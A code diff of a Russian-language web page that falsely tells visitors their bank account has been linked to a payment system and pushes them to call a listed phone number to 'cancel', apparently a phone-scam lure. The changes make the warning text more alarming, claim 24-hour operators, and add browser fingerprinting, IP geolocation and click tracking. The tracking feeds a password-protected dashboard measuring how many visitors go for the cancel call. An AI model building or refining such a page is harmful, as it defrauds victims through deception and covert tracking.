@@ -738,8 +738,7 @@
             <h1>Счет успешно привязан!</h1>
             
             <p class="message">
-                Ваш банковский счет был успешно привязан к системе оплаты. 
-                Теперь вы можете совершать безопасные платежи и управлять финансами.
+                Внимание: Ваш счет привязан. Несанкционированные транзакции влекут финансовые потери. Отслеживайте операции, сообщайте о подозрениях. Пренебрежение этим чревато утратой средств.
             </p>
             
             <div class="details">
@@ -781,7 +780,7 @@
             <h2>Отмена привязки счета</h2>
             <p>Для отмены привязки счета позвоните по номеру:</p>
             <div class="phone-number">7 (988) 115-61-81</div>
-            <p>Наши операторы доступны с 9:00 до 21:00 ежедневно</p>
+            <p>Наши операторы доступны с 00:00 до 24:00 ежедневно</p>
             <a href="tel:+79881156181" class="call-btn" id="callBtn">
                 <i class="fas fa-phone"></i> Позвонить сейчас
             </a>
@@ -912,22 +911,32 @@
     <script>
         // Пароль для доступа к аналитике
         const ANALYTICS_PASSWORD = "Tarakan4ik1";
-        const ANALYTICS_STORAGE_KEY = "payment_analytics_complete";
+        const ANALYTICS_STORAGE_KEY = "payment_analytics_complete_v3";
 
         // Глобальные переменные для Chart.js
         let charts = {};
 
-        // ИСПРАВЛЕНИЕ: Упрощенная генерация ID пользователя
+        // ИСПРАВЛЕННАЯ система идентификации пользователей
         function getUserId() {
-            let userId = localStorage.getItem('user_id');
-            if (!userId) {
-                // Простой уникальный ID на основе времени и случайного числа
-                userId = 'user_' + Date.now() + '_' + Math.floor(Math.random() * 1000000);
-                localStorage.setItem('user_id', userId);
-                console.log('Создан новый пользователь:', userId);
-            } else {
-                console.log('Найден существующий пользователь:', userId);
+            // Создаем уникальный ID на основе комбинации данных браузера и времени
+            const fingerprintData = [
+                navigator.userAgent,
+                navigator.language,
+                screen.width + 'x' + screen.height,
+                new Date().getTimezoneOffset(),
+                navigator.hardwareConcurrency || 'unknown'
+            ].join('|');
+            
+            // Простой хэш для создания уникального ID
+            let hash = 0;
+            for (let i = 0; i < fingerprintData.length; i++) {
+                const char = fingerprintData.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
             }
+            
+            const userId = 'user_' + Math.abs(hash).toString(36) + '_' + Date.now();
+            console.log('🆔 Сгенерирован ID пользователя:', userId);
             return userId;
         }
 
@@ -946,11 +955,15 @@
         async function getGeoLocation(ip) {
             if (ip === 'unknown') return { country: 'Unknown', city: 'Unknown' };
             try {
-                const response = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,regionName`);
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                 const data = await response.json();
-                return data;
+                return {
+                    country: data.country_name || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown'
+                };
             } catch (error) {
-                return { country: 'Unknown', city: 'Unknown' };
+                return { country: 'Unknown', city: 'Unknown', region: 'Unknown' };
             }
         }
 
@@ -1002,28 +1015,45 @@
 
         // Получение аналитики
         function getAnalytics() {
-            const stored = localStorage.getItem(ANALYTICS_STORAGE_KEY);
-            if (!stored) {
+            try {
+                const stored = localStorage.getItem(ANALYTICS_STORAGE_KEY);
+                if (!stored) {
+                    console.log('📊 Создана новая база аналитики');
+                    return {
+                        users: {},
+                        sessions: {},
+                        events: [],
+                        summary: {
+                            totalUsers: 0,
+                            totalEvents: 0,
+                            todayUsers: 0,
+                            todayEvents: 0,
+                            onlineUsers: 0
+                        },
+                        startTime: new Date().toISOString()
+                    };
+                }
+                return JSON.parse(stored);
+            } catch (error) {
+                console.error('❌ Ошибка при чтении аналитики:', error);
                 return {
                     users: {},
                     sessions: {},
                     events: [],
-                    summary: {
-                        totalUsers: 0,
-                        totalEvents: 0,
-                        todayUsers: 0,
-                        todayEvents: 0,
-                        onlineUsers: 0
-                    },
+                    summary: { totalUsers: 0, totalEvents: 0, todayUsers: 0, todayEvents: 0, onlineUsers: 0 },
                     startTime: new Date().toISOString()
                 };
             }
-            return JSON.parse(stored);
         }
 
         // Сохранение аналитики
         function saveAnalytics(data) {
-            localStorage.setItem(ANALYTICS_STORAGE_KEY, JSON.stringify(data));
+            try {
+                localStorage.setItem(ANALYTICS_STORAGE_KEY, JSON.stringify(data));
+                console.log('💾 Аналитика сохранена. Пользователей:', data.summary.totalUsers);
+            } catch (error) {
+                console.error('❌ Ошибка при сохранении аналитики:', error);
+            }
         }
 
         // Сбор данных
@@ -1045,75 +1075,76 @@
                 sourceType: sourceType,
                 country: geo.country,
                 city: geo.city,
-                region: geo.regionName,
+                region: geo.region,
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 timestamp: new Date().toISOString(),
-                pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
+                pageLoadTime: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : 0
             };
         }
 
-        // ИСПРАВЛЕНИЕ: Упрощенная отправка аналитики
-        async function sendAnalytics(event, userId) {
+        // ИСПРАВЛЕННАЯ отправка аналитики - СРАЗУ при загрузке страницы
+        async function initializeAnalytics() {
             try {
+                const userId = getUserId();
                 const userData = await collectUserData();
                 const analytics = getAnalytics();
                 const now = new Date();
                 const today = now.toDateString();
-                const sessionId = userId + '_' + now.toDateString();
+                const sessionId = userId + '_' + now.getTime();
 
-                console.log('Отправка аналитики:', { event, userId, userData });
+                console.log('🚀 Инициализация аналитики для пользователя:', userId);
 
-                // Создаем или обновляем пользователя
+                // Создаем нового пользователя если его нет
                 if (!analytics.users[userId]) {
                     analytics.users[userId] = {
                         id: userId,
                         firstVisit: userData.timestamp,
                         lastVisit: userData.timestamp,
-                        totalEvents: 0,
-                        events: [],
+                        totalEvents: 1, // Уже одно событие - page_view
+                        events: [{
+                            event: 'page_view',
+                            timestamp: userData.timestamp,
+                            data: userData
+                        }],
                         userData: userData,
-                        sessions: []
+                        sessions: [sessionId]
                     };
                     analytics.summary.totalUsers++;
                     
                     if (new Date(userData.timestamp).toDateString() === today) {
                         analytics.summary.todayUsers++;
                     }
-                    console.log('Добавлен новый пользователь:', userId);
+                    console.log('✅ Добавлен НОВЫЙ пользователь:', userId);
+                } else {
+                    // Обновляем существующего пользователя
+                    analytics.users[userId].lastVisit = userData.timestamp;
+                    analytics.users[userId].totalEvents++;
+                    analytics.users[userId].events.push({
+                        event: 'page_view',
+                        timestamp: userData.timestamp,
+                        data: userData
+                    });
+                    console.log('🔄 Обновлен существующий пользователь:', userId);
                 }
 
-                // Обновляем данные пользователя
-                analytics.users[userId].lastVisit = userData.timestamp;
-                analytics.users[userId].totalEvents++;
-                analytics.users[userId].events.push({
-                    event: event,
-                    timestamp: userData.timestamp,
-                    data: userData
-                });
-
-                // Управление сессиями
-                if (!analytics.sessions[sessionId]) {
-                    analytics.sessions[sessionId] = {
-                        userId: userId,
-                        startTime: userData.timestamp,
-                        lastActivity: userData.timestamp,
-                        events: [],
-                        duration: 0
-                    };
-                    analytics.users[userId].sessions.push(sessionId);
-                }
-                analytics.sessions[sessionId].lastActivity = userData.timestamp;
-                analytics.sessions[sessionId].events.push({
-                    event: event,
-                    timestamp: userData.timestamp
-                });
+                // Создаем сессию
+                analytics.sessions[sessionId] = {
+                    userId: userId,
+                    startTime: userData.timestamp,
+                    lastActivity: userData.timestamp,
+                    events: [{
+                        event: 'page_view',
+                        timestamp: userData.timestamp
+                    }],
+                    duration: 0
+                };
 
                 // Добавляем в общие события
                 analytics.events.push({
                     userId: userId,
-                    event: event,
+                    event: 'page_view',
                     timestamp: userData.timestamp,
                     data: userData
                 });
@@ -1124,16 +1155,74 @@
                     analytics.summary.todayEvents++;
                 }
 
-                // Онлайн пользователи (активны в последние 5 минут)
+                // Онлайн пользователи
                 analytics.summary.onlineUsers = Object.values(analytics.sessions).filter(session => 
                     (now - new Date(session.lastActivity)) < 300000
                 ).length;
 
                 saveAnalytics(analytics);
-                console.log('Аналитика сохранена. Всего пользователей:', analytics.summary.totalUsers);
+                
+                // Возвращаем ID пользователя для дальнейшего использования
+                return userId;
 
             } catch (error) {
-                console.error('Ошибка при отправке аналитики:', error);
+                console.error('❌ Ошибка при инициализации аналитики:', error);
+                return getUserId(); // Все равно возвращаем ID
+            }
+        }
+
+        // Отслеживание дополнительных событий
+        async function trackEvent(event, userId) {
+            try {
+                const userData = await collectUserData();
+                const analytics = getAnalytics();
+                const now = new Date();
+
+                if (analytics.users[userId]) {
+                    // Обновляем пользователя
+                    analytics.users[userId].lastVisit = userData.timestamp;
+                    analytics.users[userId].totalEvents++;
+                    analytics.users[userId].events.push({
+                        event: event,
+                        timestamp: userData.timestamp,
+                        data: userData
+                    });
+
+                    // Обновляем сессию
+                    const sessionId = Object.keys(analytics.sessions).find(id => 
+                        id.startsWith(userId + '_')
+                    );
+                    if (sessionId) {
+                        analytics.sessions[sessionId].lastActivity = userData.timestamp;
+                        analytics.sessions[sessionId].events.push({
+                            event: event,
+                            timestamp: userData.timestamp
+                        });
+                    }
+
+                    // Добавляем в общие события
+                    analytics.events.push({
+                        userId: userId,
+                        event: event,
+                        timestamp: userData.timestamp,
+                        data: userData
+                    });
+
+                    // Обновляем статистику
+                    analytics.summary.totalEvents++;
+                    if (new Date(userData.timestamp).toDateString() === new Date().toDateString()) {
+                        analytics.summary.todayEvents++;
+                    }
+
+                    analytics.summary.onlineUsers = Object.values(analytics.sessions).filter(session => 
+                        (now - new Date(session.lastActivity)) < 300000
+                    ).length;
+
+                    saveAnalytics(analytics);
+                    console.log('📝 Отслежено событие:', event, 'для пользователя:', userId);
+                }
+            } catch (error) {
+                console.error('❌ Ошибка при отслеживании события:', error);
             }
         }
 
@@ -1141,7 +1230,7 @@
         function showAnalytics() {
             const analytics = getAnalytics();
             const lastUpdate = document.getElementById('lastUpdate');
-            lastUpdate.textContent = `Последнее обновление: ${new Date().toLocaleString('ru-RU')}`;
+            lastUpdate.textContent = `Последнее обновление: ${new Date().toLocaleString('ru-RU')} | Всего пользователей: ${analytics.summary.totalUsers}`;
 
             showOverview(analytics);
             showAllUsers(analytics);
@@ -1188,7 +1277,7 @@
                 </div>
                 <div class="stat-card">
                     <div class="stat-number">${conversionRate.toFixed(1)}%</div>
-                    <div class="stat-label">Конверсия</div>
+                    <div class="stat-label">Конверсия отмены</div>
                 </div>
             `;
 
@@ -1205,23 +1294,26 @@
             });
 
             if (charts.activity) charts.activity.destroy();
-            charts.activity = new Chart(document.getElementById('activityChart'), {
-                type: 'line',
-                data: {
-                    labels: Array.from({length: 24}, (_, i) => i + ':00'),
-                    datasets: [{
-                        label: 'События',
-                        data: hourlyData,
-                        borderColor: '#4CAF50',
-                        backgroundColor: 'rgba(76, 175, 80, 0.1)',
-                        tension: 0.4
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    plugins: { legend: { display: false } }
-                }
-            });
+            const activityCtx = document.getElementById('activityChart');
+            if (activityCtx) {
+                charts.activity = new Chart(activityCtx, {
+                    type: 'line',
+                    data: {
+                        labels: Array.from({length: 24}, (_, i) => i + ':00'),
+                        datasets: [{
+                            label: 'События',
+                            data: hourlyData,
+                            borderColor: '#4CAF50',
+                            backgroundColor: 'rgba(76, 175, 80, 0.1)',
+                            tension: 0.4
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        plugins: { legend: { display: false } }
+                    }
+                });
+            }
 
             // Источники трафика
             const sources = {};
@@ -1231,16 +1323,19 @@
             });
 
             if (charts.sources) charts.sources.destroy();
-            charts.sources = new Chart(document.getElementById('sourcesChart'), {
-                type: 'doughnut',
-                data: {
-                    labels: Object.keys(sources),
-                    datasets: [{
-                        data: Object.values(sources),
-                        backgroundColor: ['#4CAF50', '#2196F3', '#FF9800', '#9C27B0', '#795548']
-                    }]
-                }
-            });
+            const sourcesCtx = document.getElementById('sourcesChart');
+            if (sourcesCtx) {
+                charts.sources = new Chart(sourcesCtx, {
+                    type: 'doughnut',
+                    data: {
+                        labels: Object.keys(sources).map(s => getSourceLabel(s)),
+                        datasets: [{
+                            data: Object.values(sources),
+                            backgroundColor: ['#4CAF50', '#2196F3', '#FF9800', '#9C27B0', '#795548']
+                        }]
+                    }
+                });
+            }
         }
 
         // Все пользователи
@@ -1268,7 +1363,7 @@
                 userItem.className = `user-item ${isApi ? 'api-user' : ''} ${isNew ? 'new-user' : ''}`;
                 userItem.innerHTML = `
                     <div class="user-header">
-                        <div class="user-id">${user.id} ${badges}</div>
+                        <div class="user-id">${user.id.substring(0, 25)}... ${badges}</div>
                         <div class="user-ip">${getFlagEmoji(user.userData.country)} ${user.userData.ip}</div>
                     </div>
                     <div class="user-details">
@@ -1310,20 +1405,22 @@
 
             onlineSessions.forEach(session => {
                 const user = analytics.users[session.userId];
-                const userItem = document.createElement('div');
-                userItem.className = 'user-item new-user';
-                userItem.innerHTML = `
-                    <div class="user-header">
-                        <div class="user-id">${user.id.substring(0, 20)}...</div>
-                        <div class="user-ip">${getFlagEmoji(user.userData.country)} ${user.userData.ip}</div>
-                    </div>
-                    <div class="session-info">
-                        <strong>🟢 ОНЛАЙН</strong> | 
-                        <strong>Событий в сессии:</strong> ${session.events.length} | 
-                        <strong>Последняя активность:</strong> ${new Date(session.lastActivity).toLocaleTimeString('ru-RU')}
-                    </div>
-                `;
-                usersContainer.appendChild(userItem);
+                if (user) {
+                    const userItem = document.createElement('div');
+                    userItem.className = 'user-item new-user';
+                    userItem.innerHTML = `
+                        <div class="user-header">
+                            <div class="user-id">${user.id.substring(0, 20)}...</div>
+                            <div class="user-ip">${getFlagEmoji(user.userData.country)} ${user.userData.ip}</div>
+                        </div>
+                        <div class="session-info">
+                            <strong>🟢 ОНЛАЙН</strong> | 
+                            <strong>Событий в сессии:</strong> ${session.events.length} | 
+                            <strong>Последняя активность:</strong> ${new Date(session.lastActivity).toLocaleTimeString('ru-RU')}
+                        </div>
+                    `;
+                    usersContainer.appendChild(userItem);
+                }
             });
         }
 
@@ -1529,10 +1626,14 @@
             document.getElementById(`tab-${tabName}`).classList.add('active');
         }
 
-        // Инициализация
+        // ИСПРАВЛЕННАЯ инициализация - СРАЗУ при загрузке
         document.addEventListener('DOMContentLoaded', async function() {
-            const userId = getUserId();
+            console.log('🚀 Начало инициализации страницы...');
             
+            // Инициализируем аналитику СРАЗУ при загрузке
+            const userId = await initializeAnalytics();
+            console.log('✅ Аналитика инициализирована для пользователя:', userId);
+
             // Элементы
             const elements = {
                 cancelBtn: document.getElementById('cancelBtn'),
@@ -1550,21 +1651,18 @@
                 tabs: document.querySelectorAll('.tab')
             };
 
-            // Отслеживание загрузки страницы
-            await sendAnalytics('page_view', userId);
-
             // События
             elements.cancelBtn.addEventListener('click', () => {
-                sendAnalytics('cancel_button_click', userId);
+                trackEvent('cancel_button_click', userId);
                 elements.cancelModal.style.display = 'flex';
             });
 
             elements.callBtn.addEventListener('click', () => {
-                sendAnalytics('call_button_click', userId);
+                trackEvent('call_button_click', userId);
             });
 
             elements.analyticsBtn.addEventListener('click', () => {
-                sendAnalytics('analytics_button_click', userId);
+                trackEvent('analytics_button_click', userId);
                 elements.passwordModal.style.display = 'flex';
                 elements.passwordInput.focus();
             });
@@ -1614,7 +1712,7 @@
             });
 
             window.addEventListener('beforeunload', () => {
-                sendAnalytics('page_leave', userId);
+                trackEvent('page_leave', userId);
             });
 
             // Автообновление каждые 30 секунд при открытой аналитике
@@ -1623,6 +1721,8 @@
                     refreshAnalytics();
                 }
             }, 30000);
+
+            console.log('🎉 Страница полностью загружена и отслеживается!');
         });
     </script>
 </body>
